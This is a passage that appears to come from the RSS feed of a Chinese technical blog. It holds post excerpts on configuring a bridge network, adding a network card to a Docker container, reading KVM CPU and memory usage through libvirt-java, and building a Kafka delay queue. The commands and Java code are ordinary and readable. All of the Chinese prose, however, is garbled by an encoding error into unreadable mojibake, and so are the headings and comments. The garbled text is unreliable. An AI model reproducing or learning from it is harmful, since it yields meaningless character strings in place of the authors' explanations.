&lt;p>è¿˜æœ‰ä¸€ç§æ¨¡å¼åœ¨openstackç­‰äº‘å¹³å°ä¸Šä½¿ç”¨è¾ƒä¸ºå¹¿æ³›ï¼Œç½‘æ¡¥ä¸Šç»‘å®šçš„ç‰©ç†ç½‘å¡æ²¡æœ‰IPï¼Œå¯¹åº”äº¤æ¢æœºé…ç½®ç«¯å£ä¸ºtrunkæ¨¡å¼ï¼Œè™šæ‹Ÿæœº ç«¯å£è¿æ¥åˆ°ç½‘æ¡¥ä¸Šï¼Œå¹¶é…ç½®ç«¯å£ä¸åŒçš„VLAN tagä»¥è¾¾åˆ°éš”ç¦»å’Œäº’è”çš„ç›®çš„ã€‚&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ol>
&lt;p>NATæ¨¡å¼å’Œä¸»æœºæ¨¡å¼éƒ½æ— éœ€å•ç‹¬é…ç½®ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸‹å¦‚ä½•é…ç½®æ¡¥æ¥ç½‘ç»œã€‚&lt;/p>
&lt;h3 id="é…ç½®æ¡¥æ¥ç½‘ç»œ">é…ç½®æ¡¥æ¥ç½‘ç»œ&lt;/h3>
&lt;p>ç‰©ç†ç½‘å¡ç»‘å®šåˆ°ç½‘æ¡¥ä¸Šä¹‹åå°±ä¼šå¯¼è‡´ç½‘ç»œæ–­å¼€ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŠŠåŸIPé…ç½®åˆ°ç½‘æ¡¥ä¸Šã€‚&lt;/p>
&lt;pre tabindex="0">&lt;code># è¿›å…¥ç½‘å¡é…ç½®æ–‡ä»¶å¤¹
cd /etc/sysconfig/network-scripts/
# æ‹·è´åŸç½‘å¡é…ç½®æ–‡ä»¶ä½œä¸ºæ¡¥æ¥ç½‘å¡
cp ifcfg-enp134s0f0 ifcfg-br0
&lt;/code>&lt;/pre>&lt;p>ä¿®æ”¹ &lt;code>ifcfg-br0&lt;/code> ä¸­çš„ &lt;code>TYPE=Ethernet&lt;/code> ä¸º &lt;code> TYPE=Bridge&lt;/code>ï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š&lt;/p></description></item><item><title>å®¹å™¨ç½‘ç»œâ€”â€”å¦‚ä½•ä¸ºdockeræ·»åŠ ç½‘å¡ï¼Ÿ</title><link>https://www.typesafe.cn/posts/how-to-add-port-for-docker/</link><pubDate>Sun, 23 May 2021 13:37:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/how-to-add-port-for-docker/</guid><description>&lt;p>ä¹‹å‰æˆ‘ä»¬ä»‹ç» Network Namespaceï¼ˆä»¥ä¸‹ç®€ç§° netnsï¼‰å’Œ veth pair æ—¶è¯´è¿‡ docker æ˜¯ä½¿ç”¨è¿™äº›æŠ€æœ¯æ¥å®ç°çš„ç½‘ç»œéš”ç¦»ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥ä¸€æ¢ç©¶ç«Ÿï¼Œçœ‹ä¸‹ docker åˆ°åº•æ˜¯å¦‚ä½•åšåˆ°çš„ã€‚&lt;/p>
&lt;h3 id="å¯åŠ¨ä¸€ä¸ªæ— ç½‘ç»œçš„å®¹å™¨">å¯åŠ¨ä¸€ä¸ªæ— ç½‘ç»œçš„å®¹å™¨&lt;/h3>
&lt;p>é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨ &lt;code>--net=none&lt;/code> å‚æ•°å¯åŠ¨ä¸€ä¸ªæ— ç½‘ç»œçš„å®¹å™¨ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº† centos é•œåƒã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>docker run -itd --name centos-test --net&lt;span style="color:#ff79c6">=&lt;/span>none centos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯åŠ¨æˆåŠŸä¹‹åæˆ‘ä»¬è¿›å…¥å®¹å™¨å†…éƒ¨ç¡®è®¤ä¸€ä¸‹æ˜¯å¦æ— ç½‘å¡ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">[&lt;/span>root@localhost ~&lt;span style="color:#ff79c6">]&lt;/span>&lt;span style="color:#6272a4"># docker ps&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>28dc2e8853df centos &lt;span style="color:#f1fa8c">&amp;#34;/bin/bash&amp;#34;&lt;/span> &lt;span style="color:#bd93f9">24&lt;/span> seconds ago Up &lt;span style="color:#bd93f9">23&lt;/span> seconds centos-test
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">[&lt;/span>root@localhost ~&lt;span style="color:#ff79c6">]&lt;/span>&lt;span style="color:#6272a4"># docker exec -it 28dc2e8853df bash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">[&lt;/span>root@28dc2e8853df /&lt;span style="color:#ff79c6">]&lt;/span>&lt;span style="color:#6272a4"># ip a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu &lt;span style="color:#bd93f9">65536&lt;/span> qdisc noqueue state UNKNOWN group default qlen &lt;span style="color:#bd93f9">1000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> inet 127.0.0.1/8 scope host lo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> valid_lft forever preferred_lft forever
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥çœ‹åˆ°ç¡®å®åªæœ‰ä¸€ä¸ªæœ¬åœ°ç¯å›ç½‘å¡ã€‚&lt;/p></description></item><item><title>ä½¿ç”¨libvirt-javaé‡‡é›†KVMè™šæ‹ŸæœºçŠ¶æ€ä¿¡æ¯</title><link>https://www.typesafe.cn/posts/collect-vm-stats-by-libvirt-java/</link><pubDate>Wed, 19 May 2021 20:18:20 +0800</pubDate><guid>https://www.typesafe.cn/posts/collect-vm-stats-by-libvirt-java/</guid><description>&lt;p>è™šæ‹ŸåŒ–å¼€å‘ç›¸è¾ƒäºæ™®é€šå¼€å‘æ˜¯ä¸€ä¸ªå†·é—¨çš„æ–¹å‘ï¼Œå¤§å¤šæ•°æ˜¯ä½¿ç”¨Pythonå¼€å‘ï¼Œå…¶ä¸­ä½¿ç”¨Javaæ¥åšè™šæ‹ŸåŒ–çš„å°‘ä¹‹åˆå°‘ï¼Œèµ„æ–™æ›´æ˜¯å°‘çš„å¯æ€œï¼Œä¸ºäº†å®ç°éœ€æ±‚æˆ‘ä¹Ÿæ˜¯è¸©äº†ä¸å°‘å‘ï¼Œä»Šå¤©å°±ä¸ºå¤§å®¶åˆ†äº«ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨ &lt;code>libvirt-java&lt;/code> æ¥é‡‡é›†KVMè™šæ‹Ÿæœºçš„èµ„æºä½¿ç”¨ä¿¡æ¯ã€‚&lt;/p>
&lt;h3 id="cpuä½¿ç”¨ç‡">CPUä½¿ç”¨ç‡&lt;/h3>
&lt;p>&lt;code>libvirt&lt;/code>å¹¶æ²¡æœ‰ç›´æ¥æä¾›è·å–è™šæ‹ŸæœºCPUä½¿ç”¨ç‡çš„æ¥å£ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ¥è®¡ç®—ï¼Œç½‘ä¸Šåˆ†äº«çš„ä»£ç æˆ–è€…å…¬å¼äº”èŠ±å…«é—¨ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯é”™è¯¯çš„ï¼Œç»è¿‡æˆ‘çš„æµ‹è¯•ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªç›¸å¯¹å‡†ç¡®çš„è®¡ç®—å…¬å¼ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-latex" data-lang="latex">&lt;span style="display:flex;">&lt;span>cpu&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>usage = (cpu&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>time&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>now - cpu&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>time&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>t&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>second&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>ago) * 100 / (t * vCpus * 10&lt;span style="color:#8be9fd;font-style:italic">^&lt;/span>9)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Javaä»£ç å¦‚ä¸‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// tç§’å‰çš„CPUæ—¶é—´&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">long&lt;/span> c1 &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">getInfo&lt;/span>().&lt;span style="color:#50fa7b">cpuTime&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Thread.&lt;span style="color:#50fa7b">sleep&lt;/span>(1000);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// å½“å‰CPUæ—¶é—´&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">long&lt;/span> c2 &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">getInfo&lt;/span>().&lt;span style="color:#50fa7b">cpuTime&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// è™šæ‹ŸCPUæ•°é‡&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">int&lt;/span> vCpus &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">getMaxVcpus&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// t ä¸º1ç§’&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Double cpuUsage &lt;span style="color:#ff79c6">=&lt;/span> 100 &lt;span style="color:#ff79c6">*&lt;/span> (c2 &lt;span style="color:#ff79c6">-&lt;/span> c1) &lt;span style="color:#ff79c6">/&lt;/span> (1 &lt;span style="color:#ff79c6">*&lt;/span> vCpus &lt;span style="color:#ff79c6">*&lt;/span> Math.&lt;span style="color:#50fa7b">pow&lt;/span>(10, 9));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log.&lt;span style="color:#50fa7b">debug&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;è™šæ‹Ÿæœº[{}]CPUä½¿ç”¨ç‡ä¸º: {}&amp;#34;&lt;/span>, uuid, cpuUsage);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å†…å­˜ä½¿ç”¨ç‡">å†…å­˜ä½¿ç”¨ç‡&lt;/h3>
&lt;p>ä¸è¦ä½¿ç”¨&lt;code>domain.getInfo()&lt;/code>è¿”å›çš„ &lt;code>memory&lt;/code>å­—æ®µï¼Œè™½ç„¶å®ƒæ³¨é‡Šå†™çš„æ˜¯&lt;code>the memory in KBytes used by the domain&lt;/code>ï¼Œä½†å®ƒçš„æ„æ€çœŸçš„ä¸æ˜¯è™šæ‹Ÿæœºå†…éƒ¨è¿›ç¨‹å·²ä½¿ç”¨çš„å†…å­˜å¤§å°ï¼Œè€Œæ˜¯ä»å®¿ä¸»æœºå™¨çš„è§’åº¦æ¥çœ‹åˆ†é…ç»™è¿™ä¸ªè™šæ‹Ÿæœºçš„å†…å­˜å®ƒä½¿ç”¨äº†å¤šå°‘ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šé…ç½®ï¼Œå®ƒä¼šå’Œ&lt;code>maxMem&lt;/code>å­—æ®µçš„å€¼æ˜¯ç›¸åŒçš„ã€‚&lt;/p>
&lt;p>æ­£ç¡®åšæ³•æ˜¯ä½¿ç”¨&lt;code>domain.memoryStats(10)&lt;/code>æ¥è·å–ï¼Œé‚£ä¸ºä»€ä¹ˆå‚æ•°è¦è¾“å…¥ä¸€ä¸ª&lt;code>10&lt;/code>å‘¢ï¼Ÿè¿™æ˜¯å› ä¸º&lt;code>10&lt;/code>ä»£è¡¨çš„æ˜¯è¦è¿”å›çš„ä¿¡æ¯æ•°é‡ï¼Œç»è¿‡æˆ‘æ‰‹åŠ¨æ‰§è¡Œ&lt;code>virsh dommemstat uuid&lt;/code> æµ‹è¯•å‘ç°æœ‰10ä¸ªå‚æ•°è¿”å›ï¼Œæ‰€ä»¥éœ€è¦å¡«å…¥&lt;code>10&lt;/code>ã€‚å¦å¤–å‘½ä»¤è¿”å›çš„&lt;code>unused&lt;/code> å­—æ®µå€¼ä¸æ•°ç»„ä¸­&lt;code>tag=8&lt;/code>çš„æ•°æ®ä¸€è‡´ï¼Œæœ€ç»ˆæˆ‘ä»¬è·å–åˆ°äº†æœªä½¿ç”¨çš„å†…å­˜å¤§å°ï¼Œè®¡ç®—å†…å­˜ä½¿ç”¨ç‡æ›´æ˜¯è½»è½»æ¾æ¾ã€‚&lt;/p>
&lt;p>Javaä»£ç å¦‚ä¸‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>MemoryStatistic&lt;span style="color:#ff79c6">[]&lt;/span> memoryStatistics &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">memoryStats&lt;/span>(10);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Optional&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>MemoryStatistic&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> first &lt;span style="color:#ff79c6">=&lt;/span> Arrays.&lt;span style="color:#50fa7b">stream&lt;/span>(memoryStatistics).&lt;span style="color:#50fa7b">filter&lt;/span>(x &lt;span style="color:#ff79c6">-&amp;gt;&lt;/span> x.&lt;span style="color:#50fa7b">getTag&lt;/span>() &lt;span style="color:#ff79c6">==&lt;/span> 8).&lt;span style="color:#50fa7b">findFirst&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> (first.&lt;span style="color:#50fa7b">isPresent&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MemoryStatistic memoryStatistic &lt;span style="color:#ff79c6">=&lt;/span> first.&lt;span style="color:#50fa7b">get&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">long&lt;/span> unusedMemory &lt;span style="color:#ff79c6">=&lt;/span> memoryStatistic.&lt;span style="color:#50fa7b">getValue&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">long&lt;/span> maxMemory &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">getMaxMemory&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">double&lt;/span> memoryUsage &lt;span style="color:#ff79c6">=&lt;/span> (maxMemory &lt;span style="color:#ff79c6">-&lt;/span> unusedMemory) &lt;span style="color:#ff79c6">*&lt;/span> 100.&lt;span style="color:#50fa7b">0&lt;/span> &lt;span style="color:#ff79c6">/&lt;/span> maxMemory;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log.&lt;span style="color:#50fa7b">debug&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;è™šæ‹Ÿæœº[{}]å†…å­˜ä½¿ç”¨ç‡ä¸º: {}&amp;#34;&lt;/span>, uuid, memoryUsage);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ç½‘å¡æ•°æ®åŒ…ä¿¡æ¯">ç½‘å¡æ•°æ®åŒ…ä¿¡æ¯&lt;/h3>
&lt;p>åŒæ ·&lt;code>libvirt&lt;/code>å¹¶æ²¡æœ‰æä¾›è·å–è™šæ‹Ÿæœºç½‘å¡çš„æ¥å£ï¼Œå› æ­¤éœ€è¦è·å–è™šæ‹Ÿæœºçš„xmlæ–‡ä»¶æ¥æŸ¥è¯¢ã€‚&lt;/p></description></item><item><title>åŸºäºkafkaå®ç°å»¶è¿Ÿé˜Ÿåˆ—</title><link>https://www.typesafe.cn/posts/kafka-delay-queue/</link><pubDate>Sun, 18 Apr 2021 00:08:38 +0800</pubDate><guid>https://www.typesafe.cn/posts/kafka-delay-queue/</guid><description>&lt;h1 id="åŸºäºkafkaå®ç°å»¶è¿Ÿé˜Ÿåˆ—">åŸºäºkafkaå®ç°å»¶è¿Ÿé˜Ÿåˆ—&lt;/h1>
&lt;p>kafkaä½œä¸ºä¸€ä¸ªä½¿ç”¨å¹¿æ³›çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¾ˆå¤šäººéƒ½ä¸ä¼šé™Œç”Ÿï¼Œä½†å½“ä½ åœ¨ç½‘ä¸Šæœç´¢â€œkafka å»¶è¿Ÿé˜Ÿåˆ—â€ï¼Œå‡ºç°çš„éƒ½æ˜¯ä¸€äº›è®²è§£æ—¶é—´è½®æˆ–è€…åªæ˜¯æä¾›äº†ä¸€äº›æ€è·¯ï¼Œå¹¶æ²¡æœ‰ä¸€ä»½çœŸå®å¯ç”¨çš„ä»£ç å®ç°ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥æ‰“ç ´è¿™ä¸ªç°è±¡ï¼Œæä¾›ä¸€ä»½å¯è¿è¡Œçš„ä»£ç ï¼ŒæŠ›ç –å¼•ç‰ï¼Œå¸å¼•æ›´å¤šçš„å¤§ç¥æ¥åˆ†äº«ã€‚&lt;/p>
&lt;h3 id="åŸºäºkafkaå¦‚ä½•å®ç°å»¶è¿Ÿé˜Ÿåˆ—">åŸºäºkafkaå¦‚ä½•å®ç°å»¶è¿Ÿé˜Ÿåˆ—ï¼Ÿ&lt;/h3>
&lt;p>æƒ³è¦è§£å†³ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ†è§£é—®é¢˜ã€‚kafkaä½œä¸ºä¸€ä¸ªé«˜æ€§èƒ½çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œåªè¦æ¶ˆè´¹èƒ½åŠ›è¶³å¤Ÿï¼Œå‘å‡ºçš„æ¶ˆæ¯éƒ½æ˜¯ä¼šç«‹åˆ»æ”¶åˆ°çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æƒ³ä¸€ä¸ªåŠæ³•ï¼Œè®©æ¶ˆæ¯å»¶è¿Ÿå‘é€å‡ºå»ã€‚&lt;/p>
&lt;p>ç½‘ä¸Šå·²ç»æœ‰å¤§ç¥ç»™å‡ºäº†å¦‚ä¸‹æ–¹æ¡ˆï¼š&lt;/p>
&lt;ol>
&lt;li>åœ¨å‘é€å»¶è¿Ÿæ¶ˆæ¯æ—¶ä¸ç›´æ¥å‘é€åˆ°ç›®æ ‡topicï¼Œè€Œæ˜¯å‘é€åˆ°ä¸€ä¸ªç”¨äºå¤„ç†å»¶è¿Ÿæ¶ˆæ¯çš„topicï¼Œä¾‹å¦‚&lt;code>delay-minutes-1&lt;/code>&lt;/li>
&lt;li>å†™ä¸€æ®µä»£ç æ‹‰å–&lt;code>delay-minutes-1&lt;/code>ä¸­çš„æ¶ˆæ¯ï¼Œå°†æ»¡è¶³æ¡ä»¶çš„æ¶ˆæ¯å‘é€åˆ°çœŸæ­£çš„ç›®æ ‡ä¸»é¢˜é‡Œã€‚&lt;/li>
&lt;/ol>
&lt;p>å°±åƒç”»ä¸€åŒ¹é©¬ä¸€æ ·ç®€å•ã€‚&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/uPic/%E6%80%8E%E6%A0%B7%E7%94%BB%E9%A9%AC.jpeg" alt="æ€æ ·ç”»é©¬">&lt;/p>
&lt;p>æ–¹æ¡ˆæ˜¯å¥½çš„ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦æ›´å¤šç»†èŠ‚ã€‚&lt;/p>
&lt;h3 id="å®Œå–„ç»†èŠ‚">å®Œå–„ç»†èŠ‚&lt;/h3>
&lt;p>&lt;strong>é—®é¢˜å‡ºåœ¨å“ªé‡Œï¼Ÿ&lt;/strong>&lt;/p>
&lt;p>é—®é¢˜å‡ºåœ¨å»¶è¿Ÿæ¶ˆæ¯å‘å‡ºå»ä¹‹åï¼Œä»£ç ç¨‹åºå°±ä¼šç«‹åˆ»æ”¶åˆ°å»¶è¿Ÿæ¶ˆæ¯ï¼Œè¦å¦‚ä½•å¤„ç†æ‰èƒ½è®©å»¶è¿Ÿæ¶ˆæ¯ç­‰å¾…ä¸€æ®µæ—¶é—´æ‰å‘é€åˆ°çœŸæ­£çš„topicé‡Œé¢ã€‚&lt;/p>
&lt;p>å¯èƒ½æœ‰åŒå­¦ä¼šè§‰å¾—å¾ˆç®€å•å˜›ï¼Œåœ¨ä»£ç ç¨‹åºæ”¶åˆ°æ¶ˆæ¯ä¹‹ååˆ¤æ–­æ¡ä»¶ä¸æ»¡è¶³ï¼Œå°±è°ƒç”¨&lt;code>sleep&lt;/code>æ–¹æ³•ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´æˆ‘å†è¿›è¡Œä¸‹ä¸€ä¸ªå¾ªç¯æ‹‰å–æ¶ˆæ¯ã€‚&lt;/p>
&lt;p>&lt;strong>çœŸçš„å¯è¡Œå—?&lt;/strong>&lt;/p>
&lt;p>ä¸€åˆ‡å¥½åƒéƒ½å¾ˆç¾å¥½ï¼Œä½†è¿™æ˜¯ä¸å¯è¡Œçš„ã€‚&lt;/p>
&lt;p>è¿™æ˜¯å› ä¸ºåœ¨è½®è¯¢kafkaæ‹‰å–æ¶ˆæ¯çš„æ—¶å€™ï¼Œå®ƒä¼šè¿”å›ç”±&lt;code>max.poll.records&lt;/code>é…ç½®æŒ‡å®šçš„ä¸€æ‰¹æ¶ˆæ¯ï¼Œä½†æ˜¯å½“ç¨‹åºä»£ç ä¸èƒ½åœ¨&lt;code>max.poll.interval.ms&lt;/code>é…ç½®çš„æœŸæœ›æ—¶é—´å†…å¤„ç†è¿™äº›æ¶ˆæ¯çš„è¯ï¼Œkafkaå°±ä¼šè®¤ä¸ºè¿™ä¸ªæ¶ˆè´¹è€…å·²ç»æŒ‚äº†ï¼Œä¼šè¿›è¡Œ&lt;code>rebalance&lt;/code>ï¼ŒåŒæ—¶ä½ è¿™ä¸ªæ¶ˆè´¹è€…å°±æ— æ³•å†æ‹‰å–åˆ°ä»»ä½•æ¶ˆæ¯äº†ã€‚&lt;/p>
&lt;p>ä¸¾ä¸ªä¾‹å­ï¼šå½“ä½ éœ€è¦ä¸€ä¸ª24å°æ—¶çš„å»¶è¿Ÿæ¶ˆæ¯é˜Ÿåˆ—ï¼Œåœ¨ä»£ç é‡Œé¢å†™ä¸‹äº†&lt;code>Thread.sleep(1000*60*60*24);&lt;/code>ï¼Œä¸ºäº†ä¸å‘ç”Ÿ&lt;code>rebalance&lt;/code>ï¼Œä½ æŠŠ&lt;code>max.poll.interval.ms&lt;/code> ä¹Ÿæ”¹æˆäº†&lt;code>1000*60*60*24&lt;/code>ï¼Œè¿™ä¸ªæ—¶å€™ä½ æˆ–è®¸ä¼šæ„Ÿè§‰åˆ°ä¸€ä¸ä¸çš„æ€ªå¼‚ï¼Œæˆ‘æ˜¯è°ï¼Ÿæˆ‘åœ¨å“ªï¼Ÿæˆ‘ä¸ºä»€ä¹ˆè¦å†™å‡ºæ¥è¿™æ ·çš„ä»£ç ï¼Ÿ&lt;/p>
&lt;p>&lt;strong>å…¶å®æˆ‘ä»¬å¯ä»¥æ›´ä¼˜é›…çš„å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚&lt;/strong>&lt;/p>
&lt;p>KafkaConsumer æä¾›äº†æš‚åœå’Œæ¢å¤çš„APIå‡½æ•°ï¼Œè°ƒç”¨æ¶ˆè´¹è€…çš„æš‚åœæ–¹æ³•åå°±æ— æ³•å†æ‹‰å–åˆ°æ–°çš„æ¶ˆæ¯ï¼ŒåŒæ—¶é•¿æ—¶é—´ä¸æ¶ˆè´¹kafkaä¹Ÿä¸ä¼šè®¤ä¸ºè¿™ä¸ªæ¶ˆè´¹è€…å·²ç»æŒ‚æ‰äº†ã€‚å¦å¤–ä¸ºäº†èƒ½å¤Ÿæ›´åŠ ä¼˜é›…ï¼Œæˆ‘ä»¬ä¼šå¯åŠ¨ä¸€ä¸ªå®šæ—¶å™¨æ¥æ›¿æ¢&lt;code>sleep&lt;/code>ã€‚ï¼Œå®Œæ•´æµç¨‹å¦‚ä¸‹å›¾ï¼Œå½“æ¶ˆè´¹è€…å‘ç°æ¶ˆæ¯ä¸æ»¡è¶³æ¡ä»¶æ—¶ï¼Œæˆ‘ä»¬å°±æš‚åœæ¶ˆè´¹è€…ï¼Œå¹¶æŠŠåç§»é‡seekåˆ°ä¸Šä¸€æ¬¡æ¶ˆè´¹çš„ä½ç½®ä»¥ä¾¿ç­‰å¾…ä¸‹ä¸€ä¸ªå‘¨æœŸå†æ¬¡æ¶ˆè´¹è¿™æ¡æ¶ˆæ¯ã€‚&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/uPic/kafka-delay-queue.png" alt="kafka-delay-queue">&lt;/p>
&lt;h3 id="javaä»£ç å®ç°">Javaä»£ç å®ç°&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.fasterxml.jackson.core.JsonProcessingException;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.fasterxml.jackson.databind.JsonNode;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.fasterxml.jackson.databind.ObjectMapper;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.clients.consumer.*;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.clients.producer.KafkaProducer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.clients.producer.ProducerConfig;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.clients.producer.ProducerRecord;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.common.TopicPartition;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.common.serialization.StringDeserializer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.common.serialization.StringSerializer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.junit.jupiter.api.BeforeEach;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.junit.jupiter.api.Test;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.springframework.boot.test.context.SpringBootTest;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.time.Duration;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.util.*;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.util.concurrent.ExecutionException;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
